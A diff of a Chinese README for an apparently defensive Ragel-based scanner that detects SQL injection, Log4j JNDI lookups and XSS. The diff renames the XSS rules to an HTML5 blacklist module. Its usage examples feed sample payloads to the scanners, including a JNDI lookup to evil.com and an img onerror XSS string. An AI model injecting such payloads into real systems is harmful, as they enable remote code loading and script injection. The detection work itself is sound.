@@ -7,7 +7,7 @@
 - `sql_syntax`：SQL 语法骨架，识别 `expr` / `select_stmt` / `constant_value`。
 - `sqli_rules`：24 条 SQLi 攻击规则（恒真条件、布尔注入、UNION/堆叠、危险函数、子查询、语句片段等）。
 - `log4j_lookup`：识别 `${...}` 表达式，按前缀归约分类 JNDI / SENSITIVE / CHAIN / EXPR。
-- `xss_rules`：5 条 XSS 攻击规则（script 标签、危险标签、事件属性、危险 URI、实体编码）。
+- `html5_xss_rules`：5 条 XSS 黑名单规则（黑标签、黑属性、黑 URL、style 注入、危险注释）。
 
 ## 目录
 
@@ -15,15 +15,16 @@
 rules/               规则源（.rl + .h），按类别分目录
   sql/               SQL 词法 / 语法骨架 / 共享片段 / 攻击规则
   log4j/             log4j 查找表达式
-  xss/               HTML 词法 / 标签结构 / 攻击规则
+  html5/             HTML5 词法（tokenizer）
+  html5_xss/         XSS 黑名单规则
 sql_scan.c           驱动：打印 token 流和骨架命中
 examples/            调用示例
   sqli_scan.c        sqli 驱动
   log4j_scan.c       log4j 驱动
-  xss_scan.c         xss 驱动
+  html5_xss_scan.c   html5_xss 驱动
   test_sqli.sh       sqli 断言
   test_log4j.sh      log4j 断言
-  test_xss.sh        xss 断言
+  test_html5_xss.sh  html5_xss 断言
 test.sh              sql 骨架断言
 Makefile             构建（make / make test）
 CMakeLists.txt       等价 cmake 构建
@@ -35,8 +36,8 @@ misc/                历史归档（ANTLR4 后端等）
 需要 ragel 和 gcc。
 
 ```
-make -j        # 构建 sql_scan / sqli_scan / log4j_scan / xss_scan
-make test      # 跑四套断言（sql 骨架 / sqli / log4j / xss）
+make -j        # 构建 sql_scan / sqli_scan / log4j_scan / html5_xss_scan
+make test      # 跑四套断言（sql 骨架 / sqli / log4j / html5_xss）
 ```
 
 cmake 等价：
@@ -52,7 +53,7 @@ cmake --build build --target validate_ragel
 ./build/ragel/sql_scan  'SELECT * FROM users WHERE 1=1'
 ./build/ragel/sqli_scan '1=1 OR 1=2'
 ./build/ragel/log4j_scan '${jndi:ldap://evil.com/a}'
-./build/ragel/xss_scan  '<img onerror=alert(1)>'
+./build/ragel/html5_xss_scan  '<img onerror=alert(1)>'
 ```
 
 ## 说明
